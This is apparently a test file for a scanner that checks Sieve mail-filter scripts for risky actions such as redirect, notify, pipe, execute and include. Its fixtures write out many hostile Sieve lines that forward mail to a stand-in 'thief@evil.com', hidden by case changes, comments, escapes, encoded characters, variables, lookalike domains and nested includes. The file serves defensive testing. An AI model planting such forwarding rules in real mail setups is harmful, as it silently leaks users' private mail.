import {
  decodeEncodedCharacters,
  mailtoIsReadable,
  mailtoRecipients,
  scanSieveScript,
  scanWithIncludes,
  tokenizeSieve,
} from './sieve-scan.js';

// Sieve's own "${...}" syntax, written without a template-literal lookalike in a plain string.
const D = '$';
const ALLOW = ['me@example.org', 'example.net'];

const blocked = (script: string, allowlist: readonly string[] = ALLOW) =>
  scanSieveScript(script, allowlist).findings.filter((f) => f.severity === 'block');
const actions = (script: string) =>
  scanSieveScript(script, ALLOW).findings.map((f) => `${f.severity}:${f.action}`);

describe('tokenizer', () => {
  it('drops comments and decodes strings', () => {
    const tokens = tokenizeSieve('# redirect "x@evil.com";\n/* redirect */ keep; "a\\"b\\\\c"');
    expect(tokens.map((t) => [t.kind, t.value])).toEqual([
      ['identifier', 'keep'],
      ['punct', ';'],
      ['string', 'a"b\\c'],
    ]);
  });

  it('reads text: blocks with dot-stuffing and CRLF', () => {
    const tokens = tokenizeSieve('vacation text: # comment\r\nline one\r\n..dot\r\n.\r\n;');
    expect(tokens[1]).toMatchObject({ kind: 'string', value: 'line one\n.dot' });
  });

  it('tracks line numbers across comments and multi-line strings', () => {
    const tokens = tokenizeSieve('/* a\nb */\n"x\ny"\nkeep;');
    expect(tokens.find((t) => t.value === 'keep')?.line).toBe(5);
  });
});

describe('redirect', () => {
  it('blocks a forward to an address not on the allowlist', () => {
    expect(blocked('redirect "thief@evil.com";')).toMatchObject([
      { action: 'redirect', target: 'thief@evil.com', line: 1 },
    ]);
  });

  it('blocks every forward when the allowlist is empty', () => {
    expect(blocked('redirect "me@example.org";', [])).toHaveLength(1);
  });

  it('allows an allowlisted address or domain, still shown as risky', () => {
    const scan = scanSieveScript('redirect "me@example.org"; redirect "x@example.net";', ALLOW);
    expect(scan.blocked).toBe(false);
    expect(scan.findings.map((f) => f.severity)).toEqual(['warn', 'warn']);
    expect(scan.findings[0]?.message).toMatch(/allowed by sieve.allowed_redirects/);
  });

  it.each([
    ['uppercase', 'REDIRECT "thief@evil.com";'],
    ['mixed case', 'ReDiReCt "thief@evil.com";'],
    [':copy', 'redirect :copy "thief@evil.com";'],
    [':COPY uppercase tag', 'redirect :COPY "thief@evil.com";'],
    ['no spaces', 'redirect:copy"thief@evil.com";'],
    ['comment between', 'redirect /* hi */ "thief@evil.com";'],
    ['hash comment between', 'redirect # hi\n "thief@evil.com";'],
    ['text: target', 'redirect text:\nthief@evil.com\n.\n;'],
    ['escaped characters', 'redirect "th\\ief\\@evil.com";'],
    ['angle brackets', 'redirect "<thief@evil.com>";'],
    ['display name', 'redirect "Me <me@example.org>";'],
    ['inside if', 'if header :contains "subject" "x" { redirect "thief@evil.com"; }'],
    ['after a decoy comment', '# redirect "me@example.org";\nredirect "thief@evil.com";'],
    ['string list', 'redirect ["me@example.org", "thief@evil.com"];'],
    ['redirect-dsn tags', 'redirect :notify "success" :ret "full" "thief@evil.com";'],
    ['subdomain of an allowed domain', 'redirect "a@evil.example.net";'],
    ['lookalike domain', 'redirect "a@example.net.evil.com";'],
    ['other user at an allowed address domain', 'redirect "other@example.org";'],
  ])('blocks a forward hidden by %s', (_label, script) => {
    expect(blocked(script).length).toBeGreaterThan(0);
  });

  it('decodes encoded-character strings before checking', () => {
    const hidden = `require "encoded-character"; redirect "${D}{hex:74 68 69 65 66}@evil.com";`;
    expect(blocked(hidden)).toMatchObject([{ target: 'thief@evil.com' }]);
    const unicode = `redirect "${D}{unicode:6d}${D}{unicode:65}@example.org";`;
    expect(scanSieveScript(unicode, ALLOW).blocked).toBe(false);
  });

  it('blocks a target built from variables', () => {
    const script = `require ["variables"]; set "t" "thief@evil.com"; redirect "${D}{t}";`;
    expect(blocked(script)).toMatchObject([{ action: 'redirect', message: /variables/ }]);
  });

  it('blocks redirect :list (external list members cannot be checked)', () => {
    expect(blocked('redirect :list "tag:example.com,2026:list";').length).toBeGreaterThan(0);
  });

  it('ignores the word redirect inside comments and strings', () => {
    const script = [
      '# redirect "thief@evil.com";',
      '/* redirect "thief@evil.com"; */',
      'if header :contains "subject" "redirect \\"thief@evil.com\\";" { keep; }',
      'vacation text:',
      'redirect "thief@evil.com";',
      '.',
      ';',
    ].join('\n');
    expect(blocked(script)).toEqual([]);
  });

  it('blocks a script it cannot tokenize rather than guessing', () => {
    expect(blocked('redirect "unterminated;')).toMatchObject([{ action: 'parse' }]);
    expect(blocked('vacation text:\nno end')).toMatchObject([{ action: 'parse' }]);
  });
});

describe('notify', () => {
  it('blocks mailto: to a non-allowlisted address, including cc/bcc', () => {
    expect(blocked('notify "mailto:thief@evil.com";')).toHaveLength(1);
    expect(blocked('notify "mailto:me@example.org?cc=thief%40evil.com";')).toHaveLength(1);
    expect(blocked('notify :message "hi" "mailto:?bcc=thief@evil.com";')).toHaveLength(1);
  });

  it('allows mailto: to allowlisted addresses', () => {
    expect(blocked('notify :importance "1" :message "x@y" "mailto:me@example.org";')).toEqual([]);
  });

  it('blocks other notification methods', () => {
    expect(blocked('notify "xmpp:thief@evil.com";')).toHaveLength(1);
  });

  it('checks the old draft syntax with the address in :options', () => {
    expect(blocked('notify :method "mailto" :options "thief@evil.com";')).toHaveLength(1);
    expect(blocked('notify :method "mailto" :options "me@example.org";')).toEqual([]);
  });

  it('blocks a mailto with a second ? or = instead of cutting it short', () => {
    expect(mailtoIsReadable('mailto:a@x.com?cc=b@x.com')).toBe(true);
    expect(mailtoIsReadable('mailto:me@example.org?cc=me@example.org?bcc=evil@x.com')).toBe(false);
    expect(mailtoIsReadable('mailto:me@example.org?cc=a=b')).toBe(false);
    expect(
      blocked('notify "mailto:me@example.org?cc=me@example.org?bcc=evil@x.com";').length,
    ).toBeGreaterThan(0);
  });

  it('parses mailto recipients', () => {
    expect(mailtoRecipients('mailto:a@x.com,b@x.com?to=c@x.com&subject=hi&BCC=d%40x.com')).toEqual([
      'a@x.com',
      'b@x.com',
      'c@x.com',
      'd@x.com',
    ]);
  });
});

describe('other actions', () => {
  it('flags vacation, reject, ereject and discard as risky only', () => {
    expect(actions('vacation "away"; reject "no"; EREJECT "no"; discard;')).toEqual([
      'warn:vacation',
      'warn:reject',
      'warn:ereject',
      'warn:discard',
    ]);
  });

  it('blocks filter unless its program is on the allowed_programs list', () => {
    expect(actions('filter "prog";')).toEqual(['block:filter']);
    expect(actions('filter "prog" "arg";')).toEqual(['block:filter']);
    expect(actions(`filter "${D}{p}";`)).toEqual(['block:filter']);
    expect(actions('filter;')).toEqual(['block:filter']);
    const allowed = (script: string) =>
      scanSieveScript(script, ALLOW, { allowedPrograms: ['prog'] }).findings.map(
        (f) => `${f.severity}:${f.action}`,
      );
    expect(allowed('filter "prog";')).toEqual(['warn:filter']);
    expect(allowed('filter "other";')).toEqual(['block:filter']);
  });

  it('warns about an extension it does not know, and about nothing it knows', () => {
    expect(actions('require "vnd.unknown.x"; keep;')).toEqual(['warn:require']);
    expect(
      actions('require ["fileinto", "copy", "variables", "vacation", "enotify"]; keep;'),
    ).toEqual([]);
    expect(actions('require "comparator-i;ascii-numeric"; keep;')).toEqual([]);
    expect(actions('require "VND.Dovecot.Debug"; keep;')).toEqual([]);
  });

  it('blocks report when the address (the last string) is not allowlisted, even without an @', () => {
    expect(blocked('report "abuse" "me@example.org" "root";')).toHaveLength(1);
    expect(blocked('report "abuse" "text" "me@example.org";')).toHaveLength(0);
    expect(blocked('report "abuse" "text" "thief@evil.com";')).toHaveLength(1);
  });

  it('blocks an unclosed string list instead of reading on to the end', () => {
    const scan = scanSieveScript('redirect [ "me@example.org" ; keep;', ALLOW);
    expect(scan.blocked).toBe(true);
    expect(scan.findings[0]).toMatchObject({ action: 'parse' });
  });

  it('scans hostile one-megabyte scripts in well under a second', () => {
    const size = 1024 * 1024;
    const hostile = [
      't '.repeat(size / 2),
      'redirect [ '.repeat(Math.floor(size / 11)),
      'notify [ '.repeat(Math.floor(size / 9)),
      'text: '.repeat(Math.floor(size / 6)),
    ];
    hostile.forEach((script) => {
      const started = performance.now();
      scanSieveScript(script, ALLOW);
      expect(performance.now() - started).toBeLessThan(1000);
    });
  });

  it('blocks pipe and execute', () => {
    expect(actions('pipe "sendmail"; if execute "x" { keep; }')).toEqual([
      'block:pipe',
      'block:execute',
    ]);
  });

  it('blocks vnd.dovecot.report to a non-allowlisted address', () => {
    expect(blocked('report "abuse" "spam" "thief@evil.com";')).toHaveLength(1);
  });

  it('collects fileinto folders, skipping tag values', () => {
    const scan = scanSieveScript(
      'fileinto :flags "\\\\Seen" :create "Lists/dev"; fileinto :copy "Archive";',
      ALLOW,
    );
    expect(scan.fileinto.map((f) => f.folder)).toEqual(['Lists/dev', 'Archive']);
  });

  it('does not mistake the names in require for actions', () => {
    expect(actions('require ["vacation", "reject", "fileinto"]; keep;')).toEqual([]);
  });
});

describe('include', () => {
  it('records personal and global includes; blocks a dynamic name', () => {
    const scan = scanSieveScript(
      `include :personal "a"; include :global :optional "g"; include "${D}{x}";`,
      ALLOW,
    );
    expect(scan.includes).toEqual([
      { name: 'a', global: false, optional: false, line: 1 },
      { name: 'g', global: true, optional: true, line: 1 },
    ]);
    expect(scan.blocked).toBe(true);
  });

  it('follows includes and blocks a redirect in an included script', async () => {
    const scripts: Record<string, string> = {
      helper: 'include "deep";',
      deep: '# looks harmless\nredirect "thief@evil.com";',
    };
    const scan = await scanWithIncludes(
      'main',
      'include :personal "helper"; keep;',
      ALLOW,
      async (name) => scripts[name] ?? null,
    );
    expect(scan.blocked).toBe(true);
    expect(scan.findings.find((f) => f.severity === 'block')).toMatchObject({
      script: 'deep',
      line: 2,
      target: 'thief@evil.com',
    });
  });

  it('survives include cycles', async () => {
    const scripts: Record<string, string> = { a: 'include "b";', b: 'include "a";' };
    const scan = await scanWithIncludes(
      'a',
      scripts.a as string,
      ALLOW,
      async (n) => scripts[n] ?? null,
    );
    expect(scan.blocked).toBe(false);
  });

  it('warns about a missing include, and blocks a global include that cannot be read', async () => {
    const scan = await scanWithIncludes(
      'main',
      'include "missing"; include :global "spam";',
      ALLOW,
      async () => null,
    );
    expect(scan.findings.map((f) => `${f.severity}: ${f.message}`)).toEqual([
      expect.stringMatching(/^warn: .*does not exist/),
      expect.stringMatching(/^block: .*global script "spam"/),
    ]);
    expect(scan.blocked).toBe(true);
  });

  it('only warns about a global include when asked to just read what is live', async () => {
    const scan = await scanWithIncludes(
      'main',
      'include :global "spam";',
      ALLOW,
      async () => null,
      {
        blockGlobalIncludes: false,
      },
    );
    expect(scan.blocked).toBe(false);
    expect(scan.findings[0]?.severity).toBe('warn');
  });
});

describe('decodeEncodedCharacters', () => {
  it('decodes hex and unicode, case-insensitively, and leaves the rest', () => {
    expect(decodeEncodedCharacters(`${D}{HEX: 41 42}${D}{Unicode:263a}${D}{name}`)).toBe(
      `AB☺${D}{name}`,
    );
  });
});
